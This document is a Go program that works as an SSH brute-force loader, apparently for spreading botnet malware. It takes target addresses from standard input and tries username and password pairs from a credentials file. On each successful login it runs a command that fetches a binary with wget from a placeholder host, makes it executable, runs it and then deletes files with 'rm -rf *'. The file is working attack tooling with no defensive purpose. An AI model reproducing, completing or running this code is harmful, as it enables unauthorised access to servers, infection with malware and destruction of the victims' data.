package main

import (
        "golang.org/x/crypto/ssh"
        "os"
        "strings"
        "sync"
        "bufio"
    "fmt"
    "time"
)

var Completed bool = false
var ipaddrs = []string{}
var group sync.WaitGroup
var syncWait sync.WaitGroup

var statusExecuted int
var statusConnected int

func ssh_b460m(address string, username string, password string) {

        sshConfig := &ssh.ClientConfig {
          User: username,
          Auth: []ssh.AuthMethod {
                ssh.Password(password),
          },
          HostKeyCallback: ssh.InsecureIgnoreHostKey(),
        }

        connection, err := ssh.Dial("tcp", fmt.Sprintf("%s:%d", address, 22), sshConfig)
        if err != nil {
          group.Done()
          return
        }

        for v:= range ipaddrs {
          if address == ipaddrs[v] {
                ipaddrs = append(ipaddrs, address)
                group.Done()
                return
          }
        }

        ipaddrs = append(ipaddrs, address)

        session, err := connection.NewSession()
        if err != nil {
          group.Done()
          return
        }

        modes := ssh.TerminalModes {
          ssh.ECHO: 0,
          ssh.TTY_OP_ISPEED: 14400,
          ssh.TTY_OP_OSPEED: 14400,
        }

        if err := session.RequestPty("xterm", 80, 40, modes); err != nil {
          session.Close()
          group.Done()
          return
        }
        statusConnected++

        session.Run("cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://ip/bin/ip.x86; chmod +x ip.x86; ./ip.x86 ip.x86; rm -rf *")
        statusExecuted++

        session.Close()
        group.Done()
        return
}

func main() {

        var i int = 0
    go func() {
        for {
            fmt.Printf("\033[91m%d's | [Attempt] Login's: %d | [Attempt] Payload for x86 Exploitation: %d\n", i, statusConnected, statusExecuted)
            time.Sleep(1 * time.Second)
            i++
        }
    }()

        for {
          reader := bufio.NewReader(os.Stdin)
          address := bufio.NewScanner(reader)

          for address.Scan() {
                combo, err := os.Open("credentials.txt")
                if err != nil {
                        fmt.Printf("\x1b[31m%s\x1b[0m\n", err)
                }

                defer combo.Close()
                comboscan := bufio.NewScanner(bufio.NewReader(combo))
                comboscan.Split(bufio.ScanLines)
                for comboscan.Scan() {
                        combo := strings.Split(comboscan.Text(), " ")
                        group.Add(1)
                        go ssh_b460m(address.Text(), combo[0], combo[1])
                }
          }
        }
}

